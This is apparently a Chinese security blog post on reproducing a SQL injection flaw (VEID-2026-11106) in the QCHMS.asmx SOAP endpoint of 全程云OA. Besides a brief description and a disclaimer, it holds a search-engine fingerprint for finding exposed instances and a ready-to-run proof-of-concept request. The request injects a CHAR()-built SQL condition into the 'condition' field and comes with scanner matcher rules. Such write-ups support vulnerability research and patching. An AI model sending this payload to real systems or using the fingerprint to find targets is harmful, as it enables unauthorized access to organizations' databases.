#  [漏洞复现]全程云OA QCHMS.asmx SQL注入漏洞(VEID-2026-11106)  
老谢
                    老谢  H4ll0 H4ck3r   2026-03-25 12:32  
  
```
声明: 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，H4ll0 H4ck3r及文章作者不为此承担任何责任。
H4ll0 H4ck3r拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经H4ll0 H4ck3r允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
```  
  
**漏洞描述**  
```
全程云OA QCHMS.asmx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
```  
  
**影响版本**  
```
全程云OA
```  
  
**空间测绘**  
```
body="images/yipeoplehover.png"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXMeDgk2mm5Q2GX6K4mCeS1AU4rRYF249qXxyH6QeeUOicHJekTXuicGX3AoxN6ibibQzWW7iawj23FcNZrU4nVyZ1BibnicujU9T659E0/640?wx_fmt=png&from=appmsg "")  
  
**本地漏洞环境复现**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXPWklOVrmKAgaoTJkSa1qAA329qDOe6jVS2Xd4ibcrUjJibgHVbNXy9rmcVPh7aFPiavSb1fic8dfVTgKibAaePDRRwibzn9gcz3IRiak/640?wx_fmt=png&from=appmsg "")  
  
**Veil POC**  
```
POST /OA/HMS/QCHMS.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
SOAPAction: "http://tempuri.org/GetProjectResumeList"
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetProjectResumeList xmlns="http://tempuri.org/">
   <pageIndex>1</pageIndex>
   <pageSize>20</pageSize>
   <condition> AND 1078 IN (SELECT CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(111)+CHAR(32)+CHAR(118)+CHAR(101)+CHAR(105)+CHAR(108))</condition>
  </GetProjectResumeList>
 </soap:Body>
</soap:Envelope>

#@ condition: and
#@ matcher: body contains "'hello veil'"
#@ matcher: status_code == 500
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXOhCtEoSVwlz1BMsibNAtnbpVllvaTsQ2pwkFUXR4hx47icBCb07P7CtECRPQO3C61F0zIhAP6x47Ox0cDSuYwrwuia7eXexqxg7M/640?wx_fmt=png&from=appmsg "")  
  
